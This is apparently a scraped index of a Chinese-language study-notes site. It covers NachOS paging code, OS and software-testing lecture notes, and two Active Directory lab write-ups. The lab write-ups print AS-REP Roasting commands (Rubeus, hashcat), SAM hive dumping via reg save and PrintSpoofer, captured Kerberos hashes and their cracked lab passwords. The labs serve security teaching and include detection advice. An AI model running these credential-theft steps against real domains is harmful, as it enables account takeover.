page into the main memory if the main memory is not full if(j\u0026lt;NumPhysPages) { char *buffer; //temporary save page buffer = new char[PageSize]; kernel-\u0026gt;machine-\u0026gt;UsedPhyPage[j]=TRUE; kernel-\u0026gt;machine-\u0026gt;PhyPageInfo[j]=pageTable[vpn].ID; kernel-\u0026gt;machine-\u0026gt;main_tab[j]=\u0026amp;pageTable[vpn]; pageTable[vpn].physicalPage = j; pageTable[vpn].valid = TRUE; pageTable[vpn].LRU_counter++; // counter for LRU kernel-\u0026gt;SwapDisk-\u0026gt;ReadSector(pageTable[vpn].virtualPage, buffer); bcopy(buffer,\u0026amp;mainMemory[j*PageSize],PageSize); } // main memory is full, page replacement else { char *buffer1; char *buffer2; buffer1 = new char[PageSize]; buffer2 = new char[PageSize]; //Random victim = (rand()%32); //LRU int min = pageTable[0].LRU_counter; victim=0; for(int index=0;index\u0026lt;32;index++) { if(min \u0026gt; pageTable[index].LRU_counter) { min = pageTable[index].LRU_counter; victim = index; } } pageTable[victim].LRU_counter++; //printf(\u0026#34;Number %d page is swapped out\\n\u0026#34;,victim); // perform page replacement, write victim frame to disk, read desired frame to memory bcopy(\u0026amp;mainMemory[victim*PageSize],buffer1,PageSize); kernel-\u0026gt;SwapDisk-\u0026gt;ReadSector(pageTable[vpn].virtualPage, buffer2); bcopy(buffer2,\u0026amp;mainMemory[victim*PageSize],PageSize); kernel-\u0026gt;SwapDisk-\u0026gt;WriteSector(pageTable[vpn].virtualPage,buffer1); main_tab[victim]-\u0026gt;virtualPage=pageTable[vpn].virtualPage; main_tab[victim]-\u0026gt;valid=FALSE; //save the page into the main memory pageTable[vpn].valid = TRUE; pageTable[vpn].physicalPage=victim; kernel-\u0026gt;machine-\u0026gt;PhyPageInfo[victim]=pageTable[vpn].ID; main_tab[victim]=\u0026amp;pageTable[vpn]; //printf(\u0026#34;Page replacement finish\\n\u0026#34;); } /*-----------------------Homework for Memory Management------------------------*/ } entry = \u0026amp;pageTable[vpn]; } ... } Result # ./nachos -e ../test/sort ./nachos -e ../test/matmult ./nachos -e ../test/matmult -e ../test/sort Reference # github/pai4451 github/wangssuming [1] Supplementary Note for bcopy "},{"id":203,"href":"/security/course/ntu-os/ntu-operating-system-review-notes/","title":"NTU Operating System Review Notes","section":"Securities","content":" NTU Operating System Review Notes # tags: NTU_OS Operating System # [TOC]\nCh 6 Synchronization # Process communication # Race condition # 就是Project1提到的共享記憶體的問題，導致multi-thread執行的結果會完全錯誤\n解決策略 Disable interrupt process在對shared memory進行變數存取之前，先disable interrupt，直到完成此次存取後才enable，這樣的話這段時間，CPU就不會被其他processes搶走(preempted) Critical section design 必須滿足三個criteria Mutual exclusion: 在任何時間點，最多只允許一個process在他自己的CS內活動，不可同時有多個process在各自的CS內活動 Progress: 如果有人想進去CS，遲早進的去 Bounded waiting: 在一定時間內一定進的去 架構圖 spinlock busy waiting Critical section design的方法 # Software solution 兩個processes Peterson\u0026rsquo;s solution: 有turn和flag兩個變數，分別代表目前的token在誰手上(turn)，以及表示有無意願進入CS(flag) N個processes Bakery\u0026rsquo;s ALG: 就是領號碼牌，號碼最小的人優先，若同時有多人持有相同的號碼牌，則以PID最小的優先 Hardware 指令支援 OS提出了mutex lock的概念，並用acquire()和release()的方法實踐 Semaphore 一種可以解決CS design和processes synchronization problem的data type，會提供兩個atomic operations: wait(s)和signal(s) wait(s): while(s\u0026lt;=0) {do nothing;}s--; signal(s): s++ 簡單來說，s就是看現在可以使用的資源有多少(例如有多少台printer)，如果資源被分出去一個，s就減一，如果都沒有資源了，就一直等待，直到有人釋放資源，釋放資源的時候，s就會加一，所以和前面提到的mutex lock幾乎一樣，wait(s)就是acquire()，而signal(s)就是release() Semaphore的種類 有使用busy-waiting: spinlock semaphore:其實就是上面說的mutex lock和正常semaphore的概念 沒有使用busy-waiting: Non-Busy-Waiting semaphore: 看講義 Monitor 用來解決synchronization problem的高階資料結構 其實就是物件導向的方式，利用private、initialization等方式，創造monitor這個class object Message Passing技術 # Direct communication Symmetric: 其實就是TCP的方式 Asymmetric: 就是UDP的方式 Indirect communication Sender和receiver是透過shared mailbox建立溝通管道 Ch 7 Deadlock # 形成deadlock的必要條件 # Mutual exclusion 在任何時間點，此類型的資源最多只允許一個process使用，不可多個processes同時持有使用 Hold \u0026amp; wait 持有部分資源，且又在等待其他Process身上的資源 No preemption process不能任意剝奪其他process正在持有的資源，給自己用，要等到對方用完並release後才可以用 Circular waiting 處理方式 # Deadlock Prevention 讓必要的四個條件其中一個不成立即可 破除mutual exclusion: 辦不到，因為此性質是大多數資源與生俱來的性質，所以無法破除 破除Hold \u0026amp; wait: 法一: 除非此process能夠一次得到所需的所有資源，否則不能持有資源 法二: 允許process先持有部分資源，但是一旦process要提出其他資源的申請之前，必須要釋放出所持有的全部資源才可提出申請 破除No preemption: 改為preemptive就可以了 Deadlock Avoidance(Banker\u0026rsquo;s ALG) 就是看提出申請之後，用banker\u0026rsquo;s alg.看有沒有一組逃生通道(safe state)，若有則核准申請 Deadlock Detection \u0026amp; Recovery Recovery Kill process in the deadlock All process: 成本太高 先kill一個，再用detection檢查有沒有deadlock，若還有就再repeat，cost很高 Resources preemptive: 選擇一些lower priority的victim process，強行把資源搶過來，再紀錄這些victim是哪些，cost很高 ignore deadlock Ch 8 Memory Management Strategies # Contiguous Memory Management # 連續性配置: process必須占用一個連續的記憶體空間，OS用link-list的方式管理free memory block\n配置方法 # First-Fit 尋找第一個能容納process的hole Best-Fit 尋找size夠小但仍能塞入process的hole，問題是這樣還是有可能會有hole，而這些hole，其他process大機率也是不能用(因為太小了) Worst-Fit 找最大的那個hole External \u0026amp; Internal Fragmentation # External Fragmentation # 在連續性的配置策略下，全部的hole size加總大於要放入的process，但是卻沒有一個hole能夠容納此process就是外部碎裂 How to solve? compaction的技術(搬移) Page Memory management(採取非連續性的配置策略) 提供多套的base / limit registers for the code section and data section of a process，降低外碎的機率 Internal Fragmentation # 配置給process的空間超過process需求大小，兩者之間的差值就是內部碎裂，這個概念比較直觀，就像前面說的，這樣的hole，對於其他process來說，大機率也是不能用的，形成浪費 Page memory Management # 優點：沒有external fragmentation，可支援virtual memory的實施 缺點：有internal fragmentation 利用register或memory或TLB來存取page table Effective memory access time公式(P is TLB hit ratio) $P*(TLB time+memory access time) + (1-P)(TLBtime+2memory access time)$ Page Table Too large solution Hierarchical paging Hashing page table Inverted page table 以physical memory為記錄對象，若physical memory有n個frames，則Inverted page table就有n個entry，每個entry紀錄此frame是存放哪個process的哪個page Segment Memory Management # 其實就是以原始的logical memory中的每一個segmentation為一單位，當然每一個section的大小都不一樣(例如：code segment/data segment/stack segment等)，並分配到練續性的physical memory(單一一個segment，segment之間不一定要連續) Kernel會替每個process建立一個segment table，並記錄每個segment的base和limit Ch 9 Virtual-Memory Management # 主要目的：允許process size在大於free physical memory space的情況下，仍能讓process執行，主要的概念是，我只把一些要用到的部分(目前需要的資源，比方說程式片段或是data)從disk存取到physical memory中，這樣就可以了，如果現在要用的page不在physical memory中，就再從disk中讀取近來\nDemand Paging # 是建立在page memory management的基礎上，為了達到上述的要求，需要在page table中新增一個bit，用來表達此page有沒有在physical memory中 Page fault處理 # Effective memory access time計算 # Page Replacement # 當page fault發生，且physical memory已經沒有多餘的free frame時，就要做page replacement，也就是找一個苦主，寫回去disk，並把要存取的部分放到memory中\nFIFO: 最早仔入的page就要成為victim page OPT(optimal): 會依據未來長期不會用到的page當作victim page LRU: 最近不常使用的page就是victim page Counter(假的LRU) Stack(真的LRU) LRU近似作法 此作法會在page table中再增加一個新的bit，表示從上一次page fault到此次page fault中間有無被用過 Second chance: 簡單來說，就是從某一個page往下開始找，如果此page的reference bit是1，則變成零，如果原本就是零則當作victim page LFU \u0026amp; MFU Lease frequently used \u0026amp; Most frequently used 選擇使用次數最少/多的page當作victim page Page buffering 系統保留一個free frame(私房錢) Thrashing及解決方法 # CPU utilization急速下降 I/O-device 異常忙碌 Process花在page fault的處理時間遠大於正常執行時間 以上三點滿足就是thrashing 當process分配到的frame數量不足時，則process會經常page fault，需要做page replacement How to solve? Decrease multi-programming 利用page fault frequency控制機制，來限制thrashing 利用working set model技術，來預估各個process在不同執行時期所需要的frame數量 超重要的總結 # "},{"id":204,"href":"/security/course/ntu-st/ntu-software-testing-notes-1/","title":"NTU Software Testing Notes","section":"Securities","content":" NTU Software Testing Notes # tags: NTU_ST Software Testing # All content in this presentation is refer to Pro. Farn Wang Website\n:::spoiler Click to open TOC [TOC] :::\n6.1 Regression Testing # Definition The process of re-testing software that has been modified 重複執行既有的全部或部分的相同測試 - by Esther\nNote that: Most of our testing effort is regression testing Regression tests must be automated\nType of tools Capture / Replay: Capture values entered into a GUI and replay those values on new versions(抓取輸入到GUI的value並replay到新的版本) Version control: 追踪測試集合、預期結果、測試來源、使用的標準及其過去的有效性(Keeps track of collections of tests, expected results, where the tests came from, the criterion used, and their past effectiveness) Scripting software: 管理以下流程，包含獲取測試輸入、執行軟體、獲取輸出、比較結果和生成測試報告等等(Manages the process of obtaining test inputs, executing the software, obtaining the outputs, comparing the results, and generating test reports Tools are plentiful and cheap\nManaging Tests in a Regression Suite Test suite會不斷累加新的test Test suites通常在晚上執行(固定、一段很短的時間) Policies for Updating Test Suites 要保留哪些測試? 確保始終滿足覆蓋標準(coverage criterions) Add a new test for every problem report 要刪除那些測試? 無法滿足覆蓋率的測試 從未發現故障的測試（Risky!） 與其他測試發現相同錯誤的測試（Risky!） Reordering strategies If a suite of N tests satisfies a coverage criterion, the tests can often be reordered so that the first N-x tests satisfies the criterion – so the remaining tests can be removed When a Regression Test Fails Regression tests are evaluated based on whether the test result on the new program P is equivalent to the test result on the previous version P-1(若不同則代表fail) Fails represent 3 possibilities The software has a fault – Must fix the fix The test values are no longer valid on the new version – Must delete or modify the test(測試端無效可能是待測程式也有可能是new version) The expected output is no longer valid – Must update the test(輸出端無效可能是發現新的問題要測試) Evolving Tests Over Time Changes to external interfaces can sometimes cause all tests to fail Modern capture / replay tools will not be fooled by trivial changes like color, format, and placement Automated scripts can be changed automatically via global changes in an editor or by another script(一些global configuration之類的) 但是小小的改動成本會慢慢累加 Choosing Which Regression Tests to Run Change Impact Analysis(CIA) - 一個小小的改動會對整體的測試造成多大的影響? Strategy: Strategy Pros Cons Run all tests More safety High cost of time Based on priority/risk 可以管控到重大風險的議題 Hard to implement and also need more skills on evaluating risk Based on the function(重要或常用) The most effective way to improve system reliability on a budget Hard to implement and also need more skills on evaluating what is a important function Run revise part Trivial and small scale Not comprehensive enough Selective repeat test (確認正確性和周邊是否受到影響) Fast and effectively More skills on analyze the effective part (需要較多技巧在分析上) 6.2 Integration and Testing # Big Bang - Throw all the classes together, compile the whole program, and system test it - Risky! Usually method: start small, with a few classes that have been tested thoroughly (從小地方開始) Add a small number of new classes Test the connections between the new classes and pre-integrated classes Integration testing: testing interfaces between classes Should have already been tested in isolation (unit testing) Methods, Classes, Packages Integration can be done at the method level, the class level, package level, or at higher levels of abstraction We use the word component in a generic sense which is a piece of a program that can be tested independently Integration testing is done in several ways Evaluating two specific components Testing integration aspects of the full system Putting the system together “piece by piece” Software Scaffolding(鷹架) 是為support integration和testing而創建的extra software components Stubs(票根/存根聯): 單純模擬尚未實踐或整合的method，被call的result Drivers: 單純模擬make a call to 正在測試的component(CUT)的方法 Stubs The first responsibility of a stub is to allow the CUT(Component Under Test) to be compiled and linked without error Approaches: 1.Return constant values from the stub 2.Return random values 3.Return values from a table lookup(回傳查表) 4.Return values entered by the tester during execution(回傳測試者輸入) 5.Processing formal specifications of the stubbed method Note that 1 ↦ 5 is more costly / more effective Drivers Many good programmers add drivers to every class as a matter of habit Instantiate objects and carry out simple testing(實例化+簡單測試) Criteria from previous chapters can be implemented in drivers Test drivers can easily be created automatically Values can be hard-coded or read from files Class Integration and Test Order (CITO) Which order to integrate was pretty easy: Test the “leaves” of the call tree(測試leaves) Integrate up to the root(整合到root) Goal is to minimize the number of stubs needed OO會使其更複雜 - dependencies (call, inheritance, use, aggregation) or circular dependencies : A inherits from B, B uses C, C aggregates A\u0026hellip; Which order should we integrate and test? Must \u0026ldquo;break cycles” Common goal: least stubbing Reference # 回歸測試 regression testing 一次搞懂單元測試、整合測試、端對端測試之間的差異 "},{"id":205,"href":"/security/course/ntu-st/ntu-software-testing-notes/","title":"NTU Software Testing Notes","section":"Securities","content":" NTU Software Testing Notes # tags: NTU_ST Software Testing # All content in this presentation is refer to Pro. Farn Wang Website\n:::spoiler Click to open TOC [TOC] :::\n2.5 Graph Coverage for Specifications # Design Spec. # What is design specification? 描述軟體應該有的行為(可見或不可見都有可能) What is different between requirement and specification requirement: 顧客端 / specification: 技術端 Sequence就是一連串的行為和狀態-\u0026gt;script Testing就是在看script有發生該發生的事情 Two types of description are used in this chapter Sequencing constraints State behavior Sequencing constraints # Constraint有可能是document的一些潛規則或是method上順序的限制，e.g. stack data structure在沒有push前不能pop Queue Example: precondiction就是這個例子的sequence constraint File ADT Example ADT: Abstract Data Type其實就是早期的class sequence constraint about example 寫之前要先打開file 關閉之前要先打開file 在close file之後除非再open file，不然不可以write file close file前一定要write file，不然就浪費這個procedure Static Checking: 先不跑test input，先針對畫出來的graph做checking\n[1, 3, 4, 6]就是這個instance的open到close之間沒有任何的write procedure\nEdge[1, 3]和Edge[3, 4]可能有共同變數在控制file的read、write，讓file不會經過Edge-Pair[1, 3, 4]-\u0026gt;實際上會不會發生還是要看中間的邏輯\nTesting的目的是要找出所有可能會違反test constraint或其他條件使software不正常運作\nTest Requirements for FileADT\n有write但沒open 有close但沒open close當中再包含write close-open中無任何write 如果program的設計與邏輯都正確，所有test requirements都不可執行\nState behavior # FSM: finite state machine(有限狀態機)是個用來描述軟體狀態在執行時變換的圖 FSM不太適合用在狀態很多的program Nodes: States / Edges: Transitions FSM Example 上圖是指海上熱帶氣旋和颱風之間的關係 列在FSM的變數，都是會影響state轉換的variable Application Embedded System and control software Abstract data types Compiler and operating systems Web application Language for describing FSM UML Statecharts: 比較複雜，因為state中還可以再包state Automata: 和FSM最相關 State tables(SCR) Petri nets: 和FSM有很多差異 Annotations on FSM Precondition是trigger action的前置條件 實際trigger action的是triggering event Coverage FSM Node Coverage:執行每個state Edge Coverage:執行每個transition Edge-Pair Coverage:執行每個transition-pair Data flow How to derive FSM? 由一些document可以幫助tester更快的建立FSM，e.g. system requirement, transition table, UML model Combining control flow graphs(CFGs) 不是準確描述系統的FSM，因為CFG只是把流程connect在一起，但沒辦法表現出caller和callee之間的關係 以CFG而言，可以建立如上圖(分開的狀態)，但是第6, 8, 10都可能呼叫change time method，而return時又要返回6, 8, 10的哪一個呢?相關的資訊並不會被記錄在node中 Using the software structures 以method當作一個node Modeling state variables 只要有state variable就有機會可以實踐這個方法 因為watch, stopwatch和alarm這三者互相獨立，所以只需要9種狀態 Using implicit or explicit specifications Explicit requirement Using intuition and experience when no explicit requirement Summary-Tradeoffs in Applying Graph Coverage Criteria to FSMs Pros 在實作之前就可以先設計testing 分析FSMs比分析source code容易很多 Cons 一些實施決策沒有辦法在FSM中建構出模型-\u0026gt;複雜的program(有太多的狀態) 由於推導FSM時會有一些主觀性質，造成結果存在一些差異 測試必須“映射”到程序的實際輸入，出現在FSM中的名稱可能與程序中的名稱不同 2.6 Graph Coverage for Use Cases # UML Use Cases: 就是各式的結構、圖形、邏輯等整合在一起，讓學界及業界在開發同一份project可以更無縫的整合，支援的IDE有Visual Studio-\u0026gt;由diagram產生C#、Java等template或是反過來也可以 Pros: 節省開發時間(原本是畫出diagram後還要依照requirement再寫出程式-\u0026gt;2倍時間)，且如果implement時發現有東西要修改，大部分的programmer都會直接修改code而忽略修改diagram，到最後design和implementation做的事情就會越來越遠，不利於公司的QA Graph in UML - supporting many dagram styles Structure diagram component diagram class diagram Behavior diagram activity diagrams use case diagrams statecharts Interaction diagram sequences diagram communication diagram Use Case: 系統操作的各種情境，或者說使用案例 Use Case Example 人的symbol代表一個role 橢圓形的內容就是Use Cases Elaboration: 利用附屬文件產生更詳細的model Use Case Name Summary: 對於project整體的總結 Actor Precondition Description: 正常操作的細節 Alternatives: 步驟出現例外情況(catch \u0026amp; exception) Postcondition: 當use case結束之後，應該有的狀態是甚麼 Use Case to Activity Diagrams: activity diagram約等於CFG，就是從user requirement中操作的step Covering Activity Graphs Node Coverage Edge Coverage Scenario Testing Summary of Use Case Testing Use cases定義在requirement level Very high level UML Activity Diagrams在圖中encode use cases 圖通常具有相當簡單的結構 Requirement-based testing可以使用graph coverage 直接用手做 Specified path coverage對這些圖有意義 "},{"id":206,"href":"/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/","title":"NTUSTISC - AD Note - Lab(AS-REP Roasting)","section":"Securities","content":" NTUSTISC - AD Note - Lab(AS-REP Roasting) # [TOC]\nLecture Video: 2022/05/11 AD 安全 2 Background # 第十四章 Kerberos 認證系統\n簡介：這是一種計算機網路授權協議，簡單說如果在同一個domain底下，想要存取某一個server的某項服務，則要如何驗證該使用者的身分以及授權他使用該項服務的資格?換個角度想，如果不認證會怎麼樣?首先，如果不認證使用者身分，就直接讓授權使用該項服務，則最直觀的攻擊就是DoS，或是駭客可以透過該項服務打到內網$\\to$提權$\\to$橫向移動$\\to$APT，看起來很危險；另外一方面，如果有驗證身分，但通過驗證的人一率給予使用服務的授權，又會怎麼樣?可以利用eavesdropping得到授權的ticket再利用reply attack還是可以偽造身分 提醒：Windows Kerberos和MIT Kerberos在實作上有一點不一樣，如果想要知道windows kerberos可以看飛飛的文章12，然後自行比對粘添壽老師的影片 MIT Kerberos架構： 為了防止前面提到的問題，他增加了一個TGS的Server，但純控管tickets的發放，另外在驗證上面也增加了timestamp和請求方的網路位址，這樣就可以防止reply attack，而且短時間內都不需要再進行身分認證，很方便 Windows Kerberos架構： 優點 主密鑰分配：AS 伺服器除了必須擁有客戶的主密鑰之外，還必須擁有 TGS 的主密鑰；另外，TGS 伺服器也需要擁有所有伺服器的主密鑰。這就是 Kerberos 將所有參與者都稱為 Principal 的主要原因。 客戶密碼只要輸入一次：客戶端取得通往 TGS 的門票（TicketTGS）之後，在該票的有效期限之內，都可以請求服務，而不需要再輸入密碼來索取門票。 防禦偽裝攻擊：門票（TicketTGS與 TicketB）上有登錄該票的使用者識別（ID）、工作站位址（AD）、時間戳記（TS）與有效期間（Lifetime）。攻擊者攔截到門票之後，不易在在有效期內偽裝成合法客戶。 防止重播攻擊：門票有註明時間戳記（T），當攻擊者重播門票時，接收端可以利用時間戳記辨別門票的新舊。 Lab # ==AS-REP Roasting== # 攻擊情境：在Win2016的Server Manager中的Tools可以找到Active Directory User and Computer 在一般user的property中，可以看到Account/Account options最底下有一個選項==Do not require Kerberos preauthentication==，這個功能主要是前面提到的對於身分不會認證(1, 2步驟會略過，只執行3-6)，他只會認證後面的ticket 雖然預設是不勾選，但有兩種情況會打勾 如果被駭客打進去到最高管理員，當然它會勾選這個功能方便搞事(所有帳號) 因為windows有分版本，如果要向下兼容各版本之間的認證，則該選項就一定要勾選(這也是為甚麼講師在前面有提到一定要升級AD的舊環境)，這在很古老的系統中常常發生 滿足條件：只要前面提到的功能被打開，就可以進行AS-REP Roasting 如何攻擊： 自己把Microsoft的document看懂如何pack一個packet，然後自己實作 另一種方式就直接用工具Rubeus 1.6.4，他可以直接把有勾選該項目的帳號，送出AS-REQ的請求，然後接收AS-REP的回應，並把接收到的tickets以你指定的格式印出來 Cheat Sheet: $ Rubeus.exe asreproast $ Rubeus.exe asreproast /format:hashcat /outfile:out.txt 實際執行 # Using Rubeus.exe :::spoiler Result $ Rubeus.exe asreproast ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.6.4 [*] Action: AS-REP roasting [*] Target Domain : kuma.org [*] Searching path \u0026#39;LDAP://WIN-818G5VCOLJO.kuma.org/DC=kuma,DC=org\u0026#39; for AS-REP roastable users [*] SamAccountName : reyna.gwendolyn [*] DistinguishedName : CN=Reyna Gwendolyn,CN=Users,DC=kuma,DC=org [*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128) [*] Building AS-REQ (w/o preauth) for: \u0026#39;kuma.org\\reyna.gwendolyn\u0026#39; [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$reyna.gwendolyn@kuma.org:4B08601B0A55BA231BED4333EAA6ED9C$E146006C2F6 B5EF8D78D4280E646FA601860D754261C28DC48470F2EA99E75DFD03E53F4BAC09BD1BE9697C5918 C48E5BA6A64D51A550FC6833327EBEF9A0C62F2448BA3CA3AA7D9BD375BF8BE693B1BC199A442053 AC3A40FA3F29EE3ABFB9B1B1E1C31DDD508FAB7971F1FDCE057D5A4481678511188DB99921762116 934D04C72071DAACFC6FFA8250380CD9ECECF95CC5702FD7A67AB90F18C299BB9AD8FF4A9325730E 859F2105F1AF64E170EB118111414CC44D0CDD1199860EF0D99ECD33FB618FEDCFAE96E0DFB75A4D 9EF3C06C99DBBD9C0A69A344C4C5A65B5B702152081F9 [*] SamAccountName : henrieta.sabine [*] DistinguishedName : CN=Henrieta Sabine,CN=Users,DC=kuma,DC=org [*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128) [*] Building AS-REQ (w/o preauth) for: \u0026#39;kuma.org\\henrieta.sabine\u0026#39; [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$henrieta.sabine@kuma.org:DEBC5F5111CE6D774625EB3DCC14925A$A91DD569550 A48219DAC0F53E4114DA7027E073DD6A86EFC83C79206787A84DBF6FC7F4B5168D7CBE65B073A05B B13AF1514D32D787948F91E05FF40191B6FE7819B9F5A978377D82B5E9532688B1CF28BBA1370365 68C110CAB41FEC26D262DC422CB54B678456470AE34F23B6D2CB1597E9565CACD11C1C5F9683408B 241650007B0E162C40D7694D8F5A5154254E0A54829C7784EB5493DF15812271C3161DD5937B368B 93406383215D909289E3FE096A10D396EF662C02031E6D4352C6A411EEC38B0A1D02A2E0AB03C86E CBF9C07C441C4D5EBD4269400373A2AFAD5879293B856 [*] SamAccountName : giulietta.moyra [*] DistinguishedName : CN=Giulietta Moyra,CN=Users,DC=kuma,DC=org [*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128) [*] Building AS-REQ (w/o preauth) for: \u0026#39;kuma.org\\giulietta.moyra\u0026#39; [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$giulietta.moyra@kuma.org:11CD5E39C2CEA9695C50826E6FCA66D3$9E2B2F3ED60 5D93BF02721F921D09DE188F1F7F3BE23907A73B95B30ECB0C1CFF5C68A0E814931A6A839DC1098C 2F3EF8B0A68492CA16E6CD96C843373581DD8CF14F7F58AE9B63A4717D1E8F7C2AA56DAC959F589C 1533249CA5BF72BBFC833609A0D958B7B5E692632D3557678B671E65C092494B38FC3840D09E16F4 1FE8D1BB86FAF16BD3F39E4E8CF8AC07A10FCD20E947D3A496A4204350D1E3B0448DB92AE749F3D0 7A9D1582677A5958B70DD38E2CDFC914C2848D0F9BC0E78D65AB7F3B9E1B5AFFA53588FBD7FFB297 357047776932B4EA2405ECB5705418BDE7CB8DBE725BB ::: 可以看到他總共吐出了三個hash，分別對應到三個使用者：reyna.gwendolyn, henrieta.sabine, henrieta.sabine，如果仔細對應win2016相對使用者的property會發現的確，這三個user的該選項都有打勾，現在則是利用hashcat之類的工具把hash暴力解開\nUsing Hashcat 可以直接在Kali使用hashcat，不過我是直接在windows上操作，可以參考3，講解的非常詳細 $ hashcat.exe -m 18200 -a 3 \u0026#34;.\\Kerberos-AS-REP.txt\u0026#34; -o output.txt Output Result\n$krb5asrep$23$giulietta.moyra@kuma.org:eb292e4b9e547357db6500d982df775b$2def9955e12f072fdc189adcde61dbff3939f7cfda5c84583c78335edfff1c5d246e3c311b991e26c0ca7afbb97757a2751a521b596e9da9a3ffcbec31205b61e45473cfbff58046f5a9759aa186ebbb90894749b2f0cbd91d6558e8f0750aab7c0b46d8947f843327f9dceb94c4b4043ee902856f3c01493e353c28cd956aaa0c58c6ded536e11855d4584aeed3486e379f91199eb96808631f2b72f0443e637cc66268bc8dd87528daf96b28de8fbccae28aa52b38f5069e5aa2c9b4dd9e21ed77ac30d6602459376a8a791d133f577024c43cae1ac8bd973d39e191ba535c0f660b0e:willow $krb5asrep$23$reyna.gwendolyn@kuma.org:ef97037a66f7cedcacf9aeae90e8d8cc$930cc1157dfee8d506c728f11184963e4011a0254ea83428aaf529de9c2a10c533ff12c0b6f519aad9c65a7fa6a645e6552f57936001c8b8011bbf1f3f93981bd6126befb0dd74b1df7930336f240f623d1d9e53bbb5e37864559d37ee3f1a0edd319a7252a3b6bab5b50d81967abc630eccb804dd200218b7222914776d71387c2916353c3475426515aaa5b95108b9e9ae68c8ece2dfeeaf7836dd9f3778c49c4090850925332470b9eab9c77c4549237a17f58e41b0b09a1be6a99827f5b14d78a734300bb08056c40a28b6f69fa2c7b72afa7d18d831631b19b7cbcc5a6dc928d66d:edward $krb5asrep$23$henrieta.sabine@kuma.org:cef1cda05e49376d4749ace914595ea1$43d6d77a9de81c2e1c6a00fd7ea6bbb2dc087e26568ae31ab08f2b6887ccfa427ca59fab8dd7bd69d3c2b13b5f1c4ec2dff56f975940d1096eac8bca440c5adafa49e5e8b57d3cc7fddf83a71fef5353a3e3e2a85a6269a39a007bd5272ef40ba721b30313a2054d684e8efe81b214a79af9e1d5d75b1746070486a0d90e79123d1c881a56d190a7c76f1ad951695faee37f64f7f063fd38f2d7af0476747d10c5d16540c34396a0e752aaa820b4147396829affd62b99de0fa6fd0fba13a5271d5fd8b6484a7e9ef52526d0b6cef84f1ab4c939dc977e967bd12c98ca6fb55508d1a770:therock 這三者的密碼就被爆出來了，分別是 giulietta.moyra$\\to$willow reyna.gwendolyn$\\to$edward henrieta.sabine$\\to$therock\n==How to detect it?== # Event ID: 4768(預設不開，因為在一般中大型公司中，開了這個所收到的event會超多，所以除非做好filter不然一般不開)\nReference # AD Security - [Day7] 一起來學 AD 安全吧！：AD 驗證協定 Kerberos (1) \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAD Security - [Day8] 一起來學 AD 安全吧！：AD 驗證協定 Kerberos (2) \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n【教學】密碼恢復工具 Hashcat簡易基本教學(windows7/10)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":207,"href":"/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/","title":"NTUSTISC - AD Note - Lab(Brute Force SAM)","section":"Securities","content":" NTUSTISC - AD Note - Lab(Brute Force SAM) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 得到更高權限之後，會想要更多的密碼\n密碼收集 SAM.hive(Security Account Manager) What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證 Where: C:\\Windows\\System32\\config\\SAM Password Spraying(用猜的) GPO 記憶體(lsass) Lab # ==Brute Force SAM== # 前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取 匯出SAM File 主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取 $ reg save HKLM\\SAM \u0026lt;save filename\u0026gt; $ reg save HKLM\\SYSTEM \u0026lt;save filename\u0026gt; 錯誤的方式 但經過cmd用普通權限實測會發現我們沒有這樣的資格 $ reg save HKLM\\SAM SAM.dump 錯誤: 用戶端沒有這項特殊權限。 其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file 正確的方式-1 用前面提到的web shell，打出以下指令，則SAM file就會dump到C:\\inetpub\\wwwroot\\sam.zip $ c:\\tools\\PrintSpoofer64.exe -c \u0026#34;reg save HKLM\\SAM C:\\inetpub\\wwwroot\\sam\u0026#34; 正確的方式-2 利用Invoke-NinjaCopy.ps1這個腳本，就可以複製出來，原理是使用windows的影子複製 $ .\\Invoke-NinjaCopy -Path SAM -LocalDestination C:\\tools\\SAM_COPY 但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤? :::info 如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊1解決問題 .\\Invoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:\\tools\\Invoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID=135170。 位於 線路:1 字元:1 + .\\Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestina ... + ~~~~~~~~~~~~~~~~~~ + CategoryInfo : SecurityError: (:) [], PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess ::: 解析SAM內容 拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析 Win10 v1607之前的解法 $ samdump2 system sam Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 